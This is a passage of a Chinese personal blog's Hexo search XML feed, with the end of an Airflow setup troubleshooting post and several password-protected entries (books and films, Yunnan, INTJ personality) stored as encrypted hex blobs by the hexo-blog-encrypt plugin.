class="line">在文件中一行，添加pyutil的路径（其他类似问题也可这样解决），如</span><br><span class="line">/Users/liyuxing/work/util</span><br></pre></td></tr></tbody></table></figure></li><li><p>执行 airflow webserver之后提示缺少Redis或者其他包</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通通</span><br><span class="line">pip install 缺啥装啥</span><br></pre></td></tr></tbody></table></figure></li><li><p>schedule_interval 参数意义<br><a href="http://airflow.incubator.apache.org/scheduler.html?highlight=schedule_interval#dag-runs">官方文档</a></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Airflow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>书&amp;电影</title>
      <link href="/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/About-%E4%B9%A6&amp;%E7%94%B5%E5%BD%B1/"/>
      <url>/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/About-%E4%B9%A6&amp;%E7%94%B5%E5%BD%B1/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请找作者确认" data-whm="文章校验失败">  <script id="hbeData" type="hbeData" data-hmacdigest="0897d462a2ced0a9183af93c714e57cb259457420e858dc7732ff52261dec009">23933bd71f3b356245e911eee53c218a36b1d6f84882891589910180e021c58c2116049001b58480f0e5400fdea871e732eeec4fe26f2614a9d69c8027958b4431037c57f16706eeb356d4898fbbe3251d3fe92de3d757ff8bf05b0f6cd3f9715319d3244265378e4a1d0ed077ab800f11580f8ce7ac3f23adbf56d53d36c5e84cb251979c49e770558cbe88ca4ca3b943cf3cd677c954a1b1ee58c37a0e237cd02a4ddc0f5bd82aaba83f60fffcb9d8316f283eb624f1770ba539eb0e5854ca7340926320e22398dc9f877795b1fc9e4d36012d437c7665b6c342e616802e2717a91ef985a0e8096aa0903e98bea17d5611c4078620b068a4603e3062f7b61f584b35dfd5fbc0c3bf9745aec710308921bc68c680f37592b9e6322155978c30f4492cfba067fc514b616cc24405ba2d5e7d44e0efda5f1b71c562ee7917ee41d104db77526c013a0c6e90e5fe29859588a615c4c20c9e27ad53fcafde5f1f8edb892887b496e5aa9a8638fca280d614653e8e0098ce471278af430a5e25e5f7112feacb63063592052269287c25e5111dcf80c432236e8646279373832f4e8419ad3a2e2cf59fcc004436c173ec29afcc07ffb3ab08c91d5d2cf0761853bc2cf1ab81d9e97c1b39e79ef947cef91ab6abe13d27e38b5cc17b9cf515bd7521caac1eb1c5d8e30436236bc8cb92bae9d573ac97cf50ed7e7f1f8166628d86770797f517f05c85c11e17f312e1940d24ba91ade628b95600f00f15517d7cf043bdf47a5b5342b7a0eb6bb0e1149cd65e2821c0fa362d029f335d79f19245b548ff85f30230049654720da191d9a58c44f5078e5e4e636715cf1e8898ddb69c8a28851b626aeb6a605562c2e707b1cb869295ed8b9b64ac87f5635078d60472c66185c7c3c8d64f93462b3a88dd9e33c99c113ccb86843953dcf052a6a90d665b201c75843002c897ca8dc8aedf8b856273321232d074dc489c3c202f36e5deca0e3ce19799b2bfec39f98954544c96e37bff84491eee1dbd2c4315daad8f84e99e9b7935d7f0d782ca359f8ac10ba43cd192f3ec98df093e0cecd85b9d88b30726503eb09fb6ca5dcb87bc4d3722d8a814950fb86ede0ac657a68373a10b4c87868c43c51fa249991c5787e179e936673a29bc7b5fd38f42ff24119d4c85c607be1c37e475515ef41bceed7358c339d638e3ed24a181544d10afbc1d80a60a539f36f3d4374eba196f7fec5de7c37a7ce832d6ae4113a8e4b44b2dea70d0e6b5c7fac1942736fbb7dd53824fb29a0bff625eeadc02ca1a4acf342a24a1e58a7c7da593d4db40067ca75c03168b87b048dd0c1da6dbb4024bccd23c0bd52e76cf6fdb8429919c74862e6d5be71e8e397662708c2e234579736393ff353c572d078b13320ca4380c40561c1625d67e0cf453d0d6e4b6af31285bce19221a7200c71a694393707db5ba918d9e04873a816c570dc5dbb409ed747a80131bc3d510ddc09dcc2ae36e2e0e5d9fc2e1047d67984c97318661da6c9bc530c44978b3c0f843147b83bafb3b18d01c54ceeaf8b85911c8e4851e6b941ab22e40378799a04ac135207f79377475c6ac3191797e021074d0aabd81082f437b9f7f47f16c97a33a8ee30d18eb22dac92d6cb2c483f278768a6f673837a7103ddfa442dec5dd49a482d4e0899fd656ac999eba20e817c2ebd76d77604148fa3536caa87a312ed85d46b8f57cfbbe73a687c434cf639fab7e92f9f45e3947b6cfad4960be56512e5b06f2c6d11cbffdcbd81aec95ce4c86f6e5effc8a05bc52966b818873c3924079f6b4f6519e39963d72324ea05ff3b857eaa5349235ea07e9639cb9dfcd214383b62250e8a10391c2aeaa2e0525ba6347bedf3c45b5d41bb67cf0dcf2b39f82976e56f50dd6a9857b3aceaa5977f27b935a2a055145cadb295fce3f639e3252a464ac0404fdeef2be2928930a2d7a24bb6a5319904f3cc359b2160fdf8b8ee4579f94e74bf6c5fd225ec682c9077fd328a79d728e0e9eb1f89677494a94fd42b792f84365fd452bd09bd24dba5ef79a03a2ec4a16ef02597c6e9b8d55fa1b7a2f90487416f99908e4b0b9e83a28669e9815fde63dd9c155e775d55cc4c5b4933d219749a5101822c5145ff9bbed296833a4aefd32a7428792269a0f15f7a8b46ef128f1f9287011e991e396b332423c43df27f93a77b110de6418d9b0677ef5ac65e7eb5522ac45c37f5faa1abda12244aef4c1244bd0bc5fb71859a36641fac55a4c0b3f3e4bbf296b712d1a75c540a6fc036ff34c2e8fddf85cb76f85ebd90c4125dfabe5c609baf8bcb6fe467c9637fd019a07cc7ea30bbe9c85747441cee60ea579faccf06f4e3ce1315b77c328e21707cfd8a89401f2e10dd5f8f1076d71d4e7aa6332857fa1e0a15f142bbd866f51348d3fdc297a6b098bc49e1c9d28a3712e47be5f25b8978ee65c4bd1f29fcdb631011b722f96a1abbf47590a8393e1c9d473f95b69075665d85a5981ebd216f6c6eef753fda3144940e887b1f719df3047f872f59e94a95fd1c8b7507c35b68f3b0375081bd95dfffe32a170a0d2cdc82883c0622142354dc28e18b972932e733289396d866c526e09be9cd2c0fcde411c6e24915bc5060e1f9bf332e9c75f5690cdb861a87f7b161c1adf24b65cc156c28a6d9436654153c009d51836750354fed31ea1a3cae69d1a007f9e19d35db4be2a2f2ce90555737a0b2f652b31796bedfcb8dc5ece07285f7e85b58bbb902225b6249c9599ff3518a44b3d421681c1bf7495a12c228519d9125ba58ecec7cf3058e18da97b6c7a6eb6ae98b3548b69f2e6bde7621871b3b5b3ff2d21baeab034a4470b3907dbdd77c6405ebe0ea7741586c1d01ab4736086946f128d6c85016003a357ff420a46d5a86f9aa72619f7181b1aae6ab144b8661e792438e81d3520821fb0953d16501cb0d0387980abc22cd19349e77994d2b734ec730bec1aa41e1bc60eea09317e2501416290ec81d47a6cdf2c6eb583464648eb192fef6758ec0c2bb128fec02f14c9c1f28f62a0dee418097e6e7e1884bcb438b613c31377460684a5be1057eadcfa8fc000d274afb6e5dfa168232a71378cbc77269202c24ae25d8b97b8213ac9ae89c8bdbd030243b6c1580a8bead4e79f8ff95849b18eee8fe7ee1f47ed28da3f3ff22dbaaa784a4b566570a90d6ccbceb5d19e7f6b6497462989b2208aa661101c32223288069573fb5fbc5a5450c7355220a954114ee3458c69c3957a795d0f75d3cd32181345ce5127289518f2d17b48dc936a92ad29898feeda907c71deee8590e891ac83ff66a958c812b4010560e8cf937bb1a84386c9c411e2356c7c692c1b932453fda5ff1ea7131325a39f7095bd1c3e1a0f10a800dc41954c23bcc7e38731151dd0ed30f4a73f38ae515ec620041d56c1f1f1e732fda4ddcb8f33ec5fc2a562eeafc5ac9780a84664ba1622f96cd2b5dd87b89cbe6eaedc9ac716ac8391ca4a2a916457d90fea3d02c67f8a1c230019ec2057671f402ae49bf7ce8c06464ea36a79c2b345db56741a73f8c19ccad3487ac557dc57d4a460f700b1d1e54c1bd1e39d57ca545f91af240be4b4a94a1b69017cc89f02a3bada955990e5f2a5e00a7cc4070823bab8459d1f56ed307619f0cf5dfc9de2e3f0729f79de05d48d6e3aa3ce45f831cfa0df066ef28e7f38d37e0a6aff99239f371fcc4a09bd8ac4659447a6076b1a0c58706b182d4d45dfc640934916e5b99e374f5f0f3f70efbfef367cfbce2259d8a017724eaa6477807f2f790c8c6f45f10b2d287532a8b83460ff40e4a7cad956a20f3d4017d93af5c0f2fe40ad3d76dd9618274078723b4d87638f24396d28b4c0b03a44897bafc57bddd422c802fca517746251adacdb545b9479bee0e209a3eee7b45ca66c6256da3d04f9bdf079b74de69d9d167ab50e567d000ff43760a749a4f0533dd904cada6b3936f075b18ea963e21c17f3f7b6a7ca2af51bd547c79bfc8432ebe16a6682a2c3096e376ec6806734f14e5e20a2601f65ee2abfc20e466de8993ee7be49e2b3239f95e39dad2f01722a2114829e49d4e9522c5181d1edd57ddc9f66ab2a753f532b2a97d28128fd0fb2a4734432803364ffcfdea23d5de98220fa60135e12aa661a6bdc26dbec0242581d65cf5fac54b3628b97692bc510b43a5cbdb156383e667c533d02b658eb762ced8bf737d8ffb6aa4e343f26a415e82e87f3c7c0b2177a48aef5880237f13347f85053bafe45f9d8b0f6160c1541121d6342ff76b9f6f80c3f9834c4b44b69d14f0a3c4ce7aacdb5d5c64e27fa6d968afe69e79bb7e62d0951169890eb1c3f0b7b53cb8a56894ecc323b880ff292ec0579611a24cf8c622aaf1be5d1cf311667716898c8dbbeaf1a410e1ca2998beb6643140a3c285d84da9769c62b10a7bc9599600d82436db29b8c007c4266bb19e8daae6bb995dbd15e4ad9aff8dfadf5f8f2f8c434e80678dda75c6dc12e5dc2afc88ab668e7717ac78c078b4ca0dc96d83f416e4b2c371c07d968ade430dec2b428dcea721f999584f0a8dd320f1531f891dd5c2958952c894c61e5ea5489497b9b0d3cdea7b87685b72722c431e92658b55801120ea68c2c2949687a494f15d911e0d70e744b24bee585c28b035a1698b66dfac8057aa4ac1322b02f26952cfb8fa6525d169bb14b9c2c26b6ef1f5a8bad68c4daa02b4f750d71caeac8c32b37bd403e31322fb160dcb2fab2a09864557da5ff1114b39b36e6725a7d0d2b966868d6f61b0681bceb313f0e94e7f95deca7e055f14f8aa96227e324ab9b18e75dfc951db6b7175a59ee00bc6e3241d4d1b774b06f22de66eb7964f949b53194bcbb8f32e99d417148ba038a9289e91de939c5edcdf4d15f5de2d57584b8205a53271a03049f66c6684beb9b4573f0f3f8ee49751d3d1c68accddebfc871cf4dc304d04113aba420</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-blink">      <input class="hbe hbe-input-field hbe-input-field-blink" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-blink" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-blink" data-content="请输入密码后查看">请输入密码后查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> private100 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>云南</title>
      <link href="/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/About-%E4%BA%91%E5%8D%97/"/>
      <url>/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/About-%E4%BA%91%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请找作者确认" data-whm="文章校验失败">  <script id="hbeData" type="hbeData" data-hmacdigest="e916a79408b230dcfee96fa2313fd31bfc9d90d8c372ccad888a38ff2ffa0e0b">92925db3e24629c8cfeed2d0eece38649225a9df465c049978cf1d198490948cb44fb0bf2755d146e317e548c6d56729b17957218910571e382cb896cddd25a6f6de648705214e30e7113a5abae16ee51bb36e5b43ceba6bf84a87e82ef0ca84776f890dcf65e24905e8d3510ec06c83fb4f3958b18cbf71b09697b40d8db8ca1569d20018100a0d5a1f58575b06f7500427dde1c695c9ba1fb0b1ea95533f7061c5a3397c424118b8925d68f699b02884994ccfea8a59e570f4468c3af32c4b349928e95c093051adc96bb5789b7ecf8065c95f7c11bf8a92fdf0dfcf5bb050c669fcf0ad078d24bd425b2a4980cec3d6c1883932d35697123cb0cb45cf496b0d60c63232ed4fd6b487b82b5de4610274ab77526dc43953640a825952e5afb8413709a7a919355a7ac1899a692e35b779ea206ee614f657400d253b48b8bd8cf9074c6e06711b2e3554fecd174eb2e8d129ac402a6193a92d08deab3e01a121dd6b6aeebfc66e90a707562093dbe96cb26f5910935622c2a30b00ea351623d9696c3d5e76867303112a5080da4df20773d154b688591f1a06efdf15ca1323e7f0b325073ac2ebbfde6fcee58eb9abbaf6f21ec74689bd6fcf134d402ad9cda9ccf6e14b7cec643d54ec8e8646c128c23dfa39d29ad467abd3a6c9214485e1cbcc1abc46f12dd336429f5d3ab73b2ba522e2ab9fe0b894b865da163f905995473dc67c6d1f7e4348701a15535b1872c28af244a109c0e1ee0c28a358109d1bbeac582180403461384d09df780d758d13dd114f85cc69bb7493022ed0e37f1118e4a779db9df103574584ffec1dca004e8d8444799aaf5ed4fb736a11be16f390538e704b8545faeaf6167fde600b8bc9cdb80613a421d68a926ee6a7dddcc3ce6f64a21fac586cb31cf272a6f6c40fb8662042de0725c7dd3104bfa7f05abdafca00325e94ca8dce352c20c74b171fbbad2ac9aeac2cc1fb20db112c52c44d159121ba006643da013e884bc4d9950bb909ab23fd6f5566b32ec62c9ee4e3ea7743c44c4b9d1ac99db03ceba8721b8bad2e1222003796581e2ab15e7d039f8dff6ec18cd0a403f6f049c41797af11f47cdb65ec0ca472477339bb77fea710c4b646ef43951ad24f835264e760fcb038da5c142baf454f46cb156f98ea0bd0d70fab5c63bc5b077a6670f067cdb04d1551564d9d043e7afe25ba64703a719359ce0a1a33eb1b8872df452ee90712d6f67191112e9c0697139fc8ee1750dd68063d9f776ed4d4d71bfdd4f12e7413167d4fb6782476c135f14db3427a070c667e9e95b207198094c54b80d3736156c312e3aaeceed77e8c3606f479cfb86334b74577089926e3f604598ed97187db1cb5fea6142f23e3ea144a316f0677342150c5453ab677ee487cbadf571f8a51802948ae4700765cc49728c9526ed234ce270c30bd3c5a724c012bf663da001d86ee630e469f4396e7697dd8437348ea2ddf047fec36406af21b0373aa687087067938d31a1336bd245a8bbc3adc15bb3fb0a0035fdb77206c33cbfa5cd3d4f2232f8fe3f942508817b9858bccaf0e812ba9618d8e88d854e80497f8a77c8c8881a3e1177b8dc3e177d45abd2f47a191c57cec3d25ad3c9371f58f663358c2e884ebf3a2f0054b830b7c450758731d24d34f7cfb09237cc0da98cc30207a4b746f90e24d67ffa98fbe99e77766ae518469848191f2f302956093691973649c2bcefdf4eac322c959835b6be6e6d6a2f9ac34dd2ea3a2bdbd1e1ac546f1a4e8de704fd58886af6c0eb56f78710494f495d438a13860aefcffdcbabd0750181c1e4f14b86e7a4f496c921f06f8017057253348e1bdb6b6901c9b4334ca3e10c8d95a3f5db763ac3d2283bf7f19f1e24c2474ce4e352f77d03e584473efd53ddef802e0ae2ceffdadcaa66f5d2df3ffaf668b1d35e1be1d97bc42f601e90b4ffa42976856d83da69babb551e21cc88e3e18693008bf88e2b571fef7605d819bd694397ddc4d23e7006c13129be1d0dc22efae85057a55d21f93f1d3a444dfc6d767be27877cdfa3ed170f606bae25c1c5dd1509cbea8b73eeb65d055571eb67cf91fa5775accd89ccfcdba38a7035a11a8d9a40177155445edb4346f39d36adf69591cab30c0b5ce9e63ba223d003e4ee9217502e8cd5acfa7012f8234492d15e1b5343ea6c950608a1fa4e725a3ae28d9c0b42c61094ca9125c10a8b0b6d7277568d98fa3ee03a4c114d81b889a0309287b4ded7c32659480c8fbacd62bd5cafa85acb84f4c01a5555172ce3b28e5464e9ddac0d643cad5dd4f5de59546ad94d3e8632693c0f66b23803272a8af7201bd30f4be014523ba788302b96a3e45af63db8d27be1e1fe0ec8f49653e9a1c82263e3cd0480b57755eb574159cea31fefe3d9fc7ddebc7c608cc6c08a29fa16e86953530af554d5c0e6e87338ebb8b6e13143c22e92b43d6edd900e261fdacf1838993930d0b00e6cf5241df8351e85e923407996c4302cbbd34723348378af19674704cb73be776e6a42d714e6d4b3cb618bb03749aa091b5b341d8d5f37e9fc62013870c87123542971fe8460f57df5e547db272005afcde1fa017e4370344b339e93becf6993c24ebecb05531fbe84fb06242f652bd4ffe16ed24b94da300cd0ed578fdb60ff22506b1a4492247d2e89eafe6337103f36ddc719c44e5d5fce9f84a1ec22f0a831e8727bfcd310d2d07f6539ce56ed84c8d15d333614ecad8319d651db1e7b26f4d5b435d94f1b56b1d7fbec0e423876650f4c94436884286203daf73253a930ad1d4736ef993587777134a15a4b098be498688c7903d108cca9708f903009848b7940d8b089c8ec97444cc27bc4a4eacd7d1a25dc6b529b999fbaa0f0c167efc238226eecf1b98d8c5c25568d922b25ccaf84c177f35adc6d1be78f72c0079c7e24fe8690f28db7b7171b0e40051369c16f123e28eed2678d5352abbed5249714739152daea489a457c6fd59b2cb1b2734fdeb151d51d22e377deb70e7eddbed20a9691e8c6da065bbf1b38419a6501e230f5d61ac241e6774d80959a1762994dda6a4e636f97b76a227d34d7e8b66f95b9380c214dc80ae8256696ef4d1d2ea99c0dad2e9c6621c4026d4e3db3af18d84df5d0f3dec854e45d5d54bb29ad7fbe524cb3b788583d6e99e2adb3809a2226d25b56018327d9fe65295b93564943e2bdc87866e1c1d2bc43118cc4aa9a2aa1933ab1c60e30e0c05f89ec910b3a21c487dcf2088701f6e618d6688350a851255527e422b365a35305cd2688942936882ce324024e9f6bfec8c64df429784605c4aca667a4df7c483c5d9db761179b52f54f1c6a1b046274115b7993df0b56e47ba92852a133c56e0c77acfc80d07ebee760f6d2459c65b9da769a3c75b870011ec1307f79ce6583b85c9faceb6851669950e19dfe4611e46f77cf9655130c9b3a1ea78fafb6f8fdbe3d128e73a26a643fc6766c8872183943244e1097df5f735c39164c98c9e51ae89cd65e56a5d00df121eeed6bd8d615c7aa21142e943cb61989bc52e639212759b5e0de1e5c6677416069c7239375e52ca1ed93b44a6dfca8c0b5d64c03e7f31ca006f6a62111731948b9626e178d93195bf6e86e228405b166e6cf59a91f81ea306be08c6f24085ab946e9e3a0a927d991116d16e9de989a66bacd87a02c9388124ab457a3bbd59eda1b0e16d0c2884caf27f6d9388fc5e569666e37932fd3699e5a4d30b31b8554dabdd0afefed56469f84ef66cb8e4d286b117a765140b8210e2fa0cb4260ad32767bae18f5f879be6c38ebe659ab1c6cd67c548b447175eb619cd2e71a0002242f0e48ddc41a8e93c92678365f6bdbaba8cb4f5e5bacb10bebbbb4cee00171693bbae7a4f413191410004e6f782f2f35b89ab2d66e131372d28a26e32c15798e665896b9029af0783ce503b1a98c35436624bc2af0d9185c60bc6dbebedd38e10f4727a8af52b3e8f618436d610edd8ff52daeb99f192b376922c943f80350866ea5217c76351c31d544a8d4bcc521f5a2a52325182d6f5fd0a0a549a7101ca3c663f07f14ecd81a73c0299799401adbfad3dbbadb4f6289723c332691f9899f33092897a3ff23d7863a8b8436fef9cdc3f8d225c3baa0b3defaab2669ec49221215c8d2f4fc8de754f93a21e6ea07bbd48b0275f3fa807e926e8e9cb7d9e225aa60781fb6fd4e4edc3914a5bf36ef61fc2f4dfc407105482070731398b76d6023d66e35d8c8823060ce6335e4947d63c2161f0eb57b664eb8c7d2621eb71cb2ad69ec0313d6b31125475fd0ee3ee2a17811fa51f2938e160859b6c985a145eb90c511c23ec3d4bf5883b87ce1f3c20c317c079bbb8b8a73bbf8e9a5025f20dc10333fda3f66bf74f09d627db97f84d5b9e1d5d3827ef4d497ad78962c1d81fd8819b21f2b24ed1f629fc2de22da4fee8dbbbe2ad05aed002f8c0e17b7e9b10213b4e3c37e5f2a4914ae78652a3c343c96427ae987a8ad91ba7f5a23459defe7d5d664e68ab9708c1d021ac387f601c8637a4a410de137d548a459b2e1f2d50501e3aba911fa277e39d8c65b3bbf85fbff1c18b2a4aae9a4100ce1254083de70cf7f6853330b05c86303286b8403f0f72aaeaf75c3bb4a3aa89ec81c059535a3f608fd4ecb29d2c15c5261fffff44ff727c755c0506da5d98cfb1d5b4472aca7b9b3de39081a437c162108483a22d1054123569a4f6810ab0802ef04fad7fcb9971e7031668870125e4f5389bd53580ec0ff29091274546e6c73fa3729de32ee8a646ea10138b1c4677cf76162eefdda144482d828196720cea5b2156cb39886d746e1abfe92b06939463a95bc567b62e4202125fd9bb8da99a2a630093dc26aa8872d6ae116337b77b9776379e02a64de0db07c4d9aadd77441d6fcd8115de56b31835d633975282f78fc8c47b26754cef5b802e1dd15a135f2766ae0fd4830571c2acaf91959d41395e0056e1526921cdaf37f1e366a75d78235d7eb7febbb59ab507717dd58e7ac319bac3d9fddb36e60d56a91e5408ce34b94658ce49f9514ce92770bca756c8ded36db6dd00fb468e11d8863607ec92044fcad045f64333554bc380b38ae10a2b7d82db859de75b3a04aecf7bcc3e928c4d6da8271d92a64b27b8e0a9ffbc3dc7d4deb76eba814c57ee6c26c7a8c7ea9d6b64553408f7bb166d45b945a8c9cb1dbf27ef31f619d3a946b03451fdb032e53273bdf871d58f6d87d34a8f598bb82bb92bc41ddda154bd377e71b81e1c7f7a83d9d0f6a46fc96ec5124ebcf64ef695851e2b3d3ad02dfca947c5917db53e48c55843c8a351ce2ec5414145dd6f1a916b7411303a35c91b75be6e58656d3cfd35e4412f2ffc56b987a368556e264e48ce9c52f269170db92a87dba1981e875a48a69288e3ce4534934732225b864bde51fe04440df13f4a4cf3218c0f249f91605d603799551a9a4745971c920c5619d83a4c4eef71e114d14d8f1fb284f22d4aa19a9516e73695eb7fad51173c1ab2c36d4490609aa751306f0c203050f58c81fa375955da991a058e5b4091a273fa6d4b2b801e5d999f8f022f0bb1f2febcdf6a2eb8c920e1b9e728ff56d9a248c2421c6b1ad99b769b9a774b9e3b3a631229dd5d3da12d379b1bf4bf60907a29534d07f7d9087432c7b81ad41fdc91e7a794b6ebc9bbf2ca0e957b9007f1f687bd102443d3a408125ca945d0cfa649f857b60cf81095971dfef1d1a2aa0d11f712e3f53a2ba69ae8faa5a521c17dc044e83623773c669eaef5fd4109b1b634e13c8b26110ad461469cc5ce1c80d9530edaa25d1a1d91e07b10017489cfbfb1bac1878a42a561fce60540dd70b8bff6d8bf75b61a9287dc7fd09b96cf5315d11c25d494f20e03fadc5fc1efb2631cb063b8e7aaf52c062da5c7ec4076f9d7d1b1e4e9306b02c9e4827c3633424859d10be747d504c4ed4bf0383579e8c7986b4bbb583a85c4577a3a4b3019e9ecfa17375aef82d72ed3853f21f83eb7a93dea0d2f507391835b41253bceb43006cc8218ebe36f07b90fc7e0172a050874d543e4f2d5b43fdb060be1d2814790f9520327686f0b3655086a8e32980b174d716e04f3d97728640c7099884056e3e0a933a7fd0192905fe6ae2ef687cba41071ec9b213f2e25a8bcc2bf31a2d203b527dc4329b40c5ec680ac5714956a19e632d7d2c0e3ce2d3685d428d021197f796e0d8e2d42df4f730e8c6f3cfd4fbdd8dee960cf44a8ff25f13b46ec05d8b70543e512a7be343f794346347cee93225ab04c4482997baabc25457706b9a9c0d72c8d75842aa9748fd97fd4a0bfa44e85b33e0457ab953571368ee9fe5b73d72173cb456aabccd9447000595cf73522c640716fd2569713c112fea4bd4bd0790348ded83258b569436ddeea19c4d06231323421ac968df920f5c103e79238b5edef3b7158dd5bfedea6e01483e4f2200d9a5391a2711bf68fe6e0b3f304647413125eb0c9b9b78e82435cad117e642cca6c508c127bcf9974b2514ee632648aae25dc55198ecffd9dc32bf7215df55126674f5da36a2c309b99d7b3374975340fd0513ad09fdcd6a3809ad40863b287c92ce67286659cc95ee860c50546fd2e96ba9c5af659d657346ee31c6ffb38ffcc0a5f7ed6279bc96f0e5485b836773a4d04b3137fe64283d2dd03ae976d6e5fb13b98b376c81226556d1ef49781147ddc1017146178a37f37ff4720cf0ba582f8eac0c44eae64ff267411092ad39f4a540b4f0b959a8c8bef9db920ffb6a81452a3c34925b0333a569a6af6ab0b54b5200afe82b03a945f5e1b3ad5ccf02f074c18f94721e48dea6d89bb8bb6cf211a4245b91b3f50f13535f4e122f0d293f4ff505967921cd638c06502f927d48d45f771503361da02d4a18c49ae82bde8dd55e74715d1159673a0a1654c49faac168edffd9dbfd49482c7f97ed3960bf239c8943651a9d33483996e0debcfb13d49141f431009f1878fcf7e5692baec04e642cce8da30c036fa29efe49929871664a851dc235cc831d28f37e5a108371116b040d84f96b266f4894d40c07c052db0bbd85132f2bd61cbf6c7727765befa0db1d8916b65ab1fceb10b6271b268e2e99925ba290d96d6898d72dbeedd5c6e2c4159b45800cee59c7ff10c9ca74a90bc6b75d5771023cd85e23597bb5074332a4237895d14a27e724700305d56f162e04c5d4c8ccae83172ce19981fd904453292113e0c514f55d9d76d6944d76d2138250963bf8bd0732e6f1b64fdb85d4d61d3745df47f898ea6b1a8959c2c147e82cc03f294b9b8fc871754a9d2a9822dc16c2ccb91f06c5b6a4e616cd150b6ccfc8e968678e9cb76e4f3dedb278c5d23bb1a949abfc338e4c1f7b56da823b8cc016dc47293e1d5d9df031c8b43e40a272c815531f4db35176165fef99b33de27c436cd2bcc510f4978e4fd1a97ea516532b9931749f5ebc566f303d0f712cd354818f48e04a21e4e00fb65f39b323151793bddc698bcaa00ec27abd9aab215b670ba22c2c3f5b634e8ec719e8c9fd1630471a2bb52dac8ab694b4a83bea6c3ed21aa34e9130aea742d5fced9bea7a8a7f5df017056d6087014ac91ea9e4b85d0a81fd86656be5d35298fb439349880d83266b5194b9166ac7ed2e72d4ab6b2506d2a35649276add18fcfa73869c256f32f43e0e2453c8b9906d0d21e2fcbe9745a92cc888ad135864135c8d660b2508eeec09f0a562f170b2e44b2c6808beb7b81301e76adb8f001cb5428d777669ed8e5d9594afe22c92a7424105661b88490748a95ba73cd9f746a9e432b10583cde118b37781a28954378c405b9af75cb688d21a4d58535a5bdde57ce610ca3724b835fd9032d73f78021ed4921433f3c9b736075326fea335c3b251b5a2cd43b51ad6ce5eea640767aacfbd2c105b4ad547ce0344044ed2a478b6fcd4fd9bb15e41ccf8b67ee1ec2c70098e21803c4879f3e269ec0b110b73048ea91bfc57de3f6af975fbb2be8da114451a9a6bb23f4c9d312df6baa1d10a2b4b559c0464995e41e9ea1ecc92a894a01ef902fb59c1b43b9105faf5a427caa93183a6907ea28ac45cb354d0a08df38c9616cd04733e38137d9ce15c955064ec779ea66359e9264323aead5ee943261d6da35bb9eaa7f0e8ebf324c4ccbdedc05251d9ad97fec90053d2ae12bf4a74985d73ef0beabe9995c9994ef7ef75a68fb6c9643f125d99b70ff582ae76e16951504182d8331bc2c3fd369a6120ee4471a3d98f4f392a3f08a81c88186dac5690f9dce315f8c6072ae4ae1fcf444793c276f6eec08bf1cca0140a4b068f822b5100c463d5a49388396333cd866f70e473483aac6b40892267646ef3f83959eb02a38111451cbcb4fbe2ce598f86b04df24b2007c08256fcb6a53642ce6a7194888052abeff6db9e5f5749f5880a6a06920e5382d839e543a64c5c19d6cf3881c1c06c0dfdfbfbf659e4e9fcdaa843d88e255b2670a9b6c384b0dc13445d1157e72b23b68d77e95f3589683f2b2ba05e510639dd49a2687a34d6a4aab1fa7019d6a038d5c384b8871ecd5196fba0ae8f756ce449b7cee71d15b13017fcd1a0d45fd9835e0d4a1b7376fbcc35a9c7e8486d4b05d3b216e0bebcf20f3726194a07cfab6f89b7c5296b6fbed697e13d9ff96b3f8edf5c34e2098f722cbd674dcbc3375c1af8971051a83f480ca6772e90122be744bd93dae14aa910fec844700f5eb482ea8b3877007d7234b0b19b435d8a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-blink">      <input class="hbe hbe-input-field hbe-input-field-blink" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-blink" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-blink" data-content="请输入密码后查看">请输入密码后查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> private50 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>十六型人格——INTJ</title>
      <link href="/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/About-%E5%8D%81%E5%85%AD%E5%9E%8B%E4%BA%BA%E6%A0%BC%E4%B9%8B(INTJ)/"/>
      <url>/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/About-%E5%8D%81%E5%85%AD%E5%9E%8B%E4%BA%BA%E6%A0%BC%E4%B9%8B(INTJ)/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请找作者确认" data-whm="文章校验失败">  <script id="hbeData" type="hbeData" 